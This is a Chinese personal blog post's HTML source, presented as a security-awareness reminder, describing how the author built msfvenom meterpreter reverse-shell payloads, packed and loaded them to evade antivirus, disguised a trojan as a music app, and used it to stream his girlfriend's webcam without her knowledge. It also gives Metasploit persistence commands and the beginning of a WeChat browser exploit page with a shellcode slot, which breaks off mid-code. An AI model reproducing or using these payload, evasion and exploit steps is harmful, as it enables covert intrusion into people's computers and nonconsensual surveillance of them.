@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="那天闲着蛋疼，逛博客的时候发现有一篇教育意义（很狗）的博客，就想着4.15也快到了。趁着这个机会提醒下身边的朋友，在平常网上冲浪的时候注意下网络安全，说不定玩着玩着可能就被不知不觉的直播了。阅读的文章：一次渗透妹子电脑开摄像头全过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="4.15提醒朋友注意自身网络安全记录">
+<meta property="og:url" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="那天闲着蛋疼，逛博客的时候发现有一篇教育意义（很狗）的博客，就想着4.15也快到了。趁着这个机会提醒下身边的朋友，在平常网上冲浪的时候注意下网络安全，说不定玩着玩着可能就被不知不觉的直播了。阅读的文章：一次渗透妹子电脑开摄像头全过程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/123213scsadsaxzcadsadsa.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/sdae_2sdsa17-55-38.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/20210423212319164859.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/sdasda021-04-19_18-12-55.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/2021012312163906.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/1232131231wdsada8.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/1618843022.jpg">
+<meta property="article:published_time" content="2021-04-19T05:45:48.000Z">
+<meta property="article:modified_time" content="2022-12-11T09:31:21.953Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/123213scsadsaxzcadsadsa.jpg">
+
+<link rel="canonical" href="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>4.15提醒朋友注意自身网络安全记录 | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          4.15提醒朋友注意自身网络安全记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-19 13:45:48" itemprop="dateCreated datePublished" datetime="2021-04-19T13:45:48+08:00">2021-04-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">3.5k(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">14(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>那天闲着蛋疼，逛博客的时候发现有一篇教育意义（很狗）的博客，就想着4.15也快到了。趁着这个机会提醒下身边的朋友，在平常网上冲浪的时候注意下网络安全，说不定玩着玩着可能就被不知不觉的直播了。<br>阅读的文章：<a href="https://my.oschina.net/u/4588149/blog/4421821" target="_blank" rel="noopener">一次渗透妹子电脑开摄像头全过程</a></p>
+<a id="more"></a>
+<p>看着特别有意思,不过实践起来一定要注意适当。别干违法的事= =<br>还是简单描述具体思路好了，详细的如果实现不了私聊</p>
+<h2 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h2><ul>
+<li>第一步<br>构建恶意文件<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.指定一个可执行程序 捆绑木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp -e x64/zutto_dekiru LHOST=[IP] <span class="attribute">LPORT</span>=3333 -x webshell.exe -i 12 -f exe -o /root/webshell.exe</span><br><span class="line"></span><br><span class="line">2.联合shellcodeloader免杀制作.bin文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] <span class="attribute">LPORT</span>=3333 -e x64/zutto_dekiru -f<span class="built_in"> raw </span>-o windows.bin</span><br><span class="line"></span><br><span class="line">3.生成c文件</span><br><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp -e x64/zutto_dekiru -i 10 lhost=[IP] <span class="attribute">lport</span>=3333 -f c -o ~/windows.c</span><br><span class="line"></span><br><span class="line">4.Cobaltstrike生成宏病毒代码</span><br><span class="line">一键生成宏代码后，新建一个文档或者用已经有的文档构建。（以word为例）步骤如下：</span><br><span class="line">选择 <span class="string">"视图"</span> -&gt; 宏 -&gt; 查看宏 -&gt; 创建，填入生成的宏代码即可</span><br></pre></td></tr></table></figure></li>
+<li>第二步<br>制作免杀，msfvenom生成的恶意文件基本底裤都被研究完了，生成C文件，再<ol>
+<li>加壳免杀（这个比较简单，我会！！）<ul>
+<li>upx加壳<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">sudo apt-<span class="built_in">get</span> install upx</span><br><span class="line">对windows.<span class="keyword">exe</span>进行加壳，生成的windows-upxed.<span class="keyword">exe</span>文件就是加壳后的</span><br><span class="line">sudo upx windows.<span class="keyword">exe</span> -<span class="keyword">o</span> windows-upxed.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure></li>
+<li>shellcodeloader免杀<br><img src="123213scsadsaxzcadsadsa.jpg" alt="shellcodeloader"><br>生成bin文件后利用shellcodeloader生成免杀文件</li>
+</ul>
+</li>
+<li>生成C文件自己编译,上述命令生成了buf，编译生成exe(最简单的)<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inclde&lt;bits/stdc++.h&gt;</span></span><br><span class="line">using namespace std<span class="comment">;</span></span><br><span class="line"><span class="meta">#将生成的windows.c中buf字符串复制到这里</span></span><br><span class="line">unsigned char buf[······]<span class="comment">;</span></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line"> <span class="built_in">int</span> (*<span class="function"><span class="keyword">func</span>)<span class="params">()</span> = <span class="params">(int(*)</span><span class="params">()</span>)<span class="title">buf</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span>;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>第三步<br>缕清攻击策略（以我对象为例）  <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 恶意文件捆绑她专业软件破解版发给她（可能会被发现，免杀做的有点粗糙不一定能过）</span><br><span class="line"><span class="number">2.</span> 以八卦的形式（前几天看到项XX瓜，再结合她本身是朝阳区第一吃瓜群众，这个方法可行性最高！但是会报毒，否定）</span><br></pre></td></tr></table></figure></li>
+<li>第四步<br>开始搞看来只能做个恶意程序捆绑正常文件了，先做个垃圾文件。然后更换了图标为网易云的图标。直接冲！<br><img src="sdae_2sdsa17-55-38.jpg" alt=""><br><img src="20210423212319164859.jpg" alt="上线了~"><br>立马移动到别的pid进程去了，然后利用webcam_stream在公网起了个直播哈哈，不过看了会她发现关掉没用，就关机了，然后开机发现没了就跟我得瑟，同志们我还是下手轻了。<br><img src="sdasda021-04-19_18-12-55.jpg" alt=""><br>后面通过她拍的照片发现摄像头边上的灯还是有点用的，毕竟突然亮起来肯定没好事<del>，不过我有物理遮挡</del><br><img src="2021012312163906.jpg" alt=""><br>到现在我发的文件她都不接收了，除非带着vt截图!!果然一朝被蛇咬十年怕井绳，还是亲身经历过，才了解平常网上冲浪要注意安全！<br><img src="1232131231wdsada8.jpg" alt=""></li>
+</ul>
+<h2 id="MSF权限维持"><a href="#MSF权限维持" class="headerlink" title="MSF权限维持"></a>MSF权限维持</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ps</span> <span class="string">-列出正在运行的进程</span></span><br><span class="line"><span class="attr">migrate</span> <span class="string">【PID】 -移动到一个指定的 PID 的活动进程</span></span><br></pre></td></tr></table></figure>
+<h2 id="WeChat-0day上线"><a href="#WeChat-0day上线" class="headerlink" title="WeChat 0day上线"></a>WeChat 0day上线</h2><p>当我看到这个漏洞的时候，我知道轮到她以及他们得瑟的时代结束了~<br>首先生成属于自己的shellcode,然后将buf字符串替换<code>\</code>为<code>,0</code>。在服务器上起一个服务，杀穿了~</p>
+<p><img src="1618843022.jpg" alt=""></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>PC微信好东西<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">ENABLE_LOG = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">IN_WORKER = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// run calc and hang in a loop</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">//buf字符串放在这</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> shellcode = [<span class="number">0xfc</span>,<span class="number">0xe8</span>······];</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">print</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> <span class="params">(value)</span> </span>&#123;</span></span><br><span class="line">    if (value == 0xdecaf0) &#123;</span><br><span class="line">        not_optimised_out += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += 1;</span><br><span class="line">    not_optimised_out |= 0xff;</span><br><span class="line">    not_optimised_out *= 12;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span></span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> g_array;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">cb</span><span class="params">(flag)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span></span><br><span class="line">    g_array[0] = 0x1dbabe * 2;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="string">'c01db33f'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">String</span>();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.buffer = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.buffer_view = <span class="literal">null</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_buffer = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_view = <span class="literal">null</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.prevent_opt = [];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.slot = <span 